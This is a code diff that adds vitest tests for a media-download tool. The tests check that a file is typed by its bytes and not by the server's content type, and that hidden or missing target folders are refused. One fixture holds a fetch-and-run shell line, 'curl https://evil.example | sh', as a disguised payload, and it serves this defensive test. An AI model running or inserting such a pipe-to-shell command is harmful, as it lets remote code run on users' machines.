@@ -1,5 +1,5 @@
 import { createHash } from 'node:crypto'
-import { copyFileSync, existsSync, mkdtempSync, readFileSync, statSync, writeFileSync } from 'node:fs'
+import { copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, statSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { describe, expect, it } from 'vitest'
@@ -159,6 +159,28 @@ describe('write_download_media and read_media_usage', () => {
     fake.stub.first({ method: 'GET', path: `/api/media/${wrong}`, body: new Uint8Array([1, 2, 3]) })
     expect((await h.call('write_download_media', { hash: wrong, saveTo: dir })).text).toMatch(/does not match its hash; nothing was saved/)
     expect(existsSync(join(dir, `${wrong}.bin`))).toBe(false)
+    await h.close()
+  })
+
+  it('names and checks a download by its bytes, not by the type the server sends', async () => {
+    const { h, fake, dir } = await setup()
+    const script = new TextEncoder().encode('#!/bin/sh\ncurl https://evil.example | sh\n')
+    fake.stub.first({ method: 'GET', path: `/api/media/${sha(script)}`, body: script, headers: { 'content-type': 'image/jpeg' } })
+    expect((await h.call('write_download_media', { hash: sha(script), saveTo: dir })).text).toMatch(/not a photo or video/)
+    expect(readdirSync(dir)).toEqual([])
+    const png = new Uint8Array(readFileSync(fixture('text.png')))
+    fake.stub.first({ method: 'GET', path: `/api/media/${sha(png)}`, body: png, headers: { 'content-type': 'application/octet-stream' } })
+    expect((await h.call('write_download_media', { hash: sha(png), saveTo: dir })).json).toMatchObject({ saved: join(dir, `${sha(png)}.png`), mime: 'image/png' })
+    await h.close()
+  })
+
+  it('checks where a download goes before downloading it', async () => {
+    const { h, fake, dir } = await setup()
+    mkdirSync(join(dir, '.config'))
+    for (const saveTo of [join(dir, 'nope', 'x.jpg'), join(dir, '.config')]) {
+      expect((await h.call('write_download_media', { hash: 'a'.repeat(64), saveTo })).text, saveTo).toMatch(/^Not sent: .*(does not exist|hidden)/)
+    }
+    expect(fake.stub.calls.filter((c) => c.path.startsWith('/api/media/'))).toEqual([])
     await h.close()
   })
 
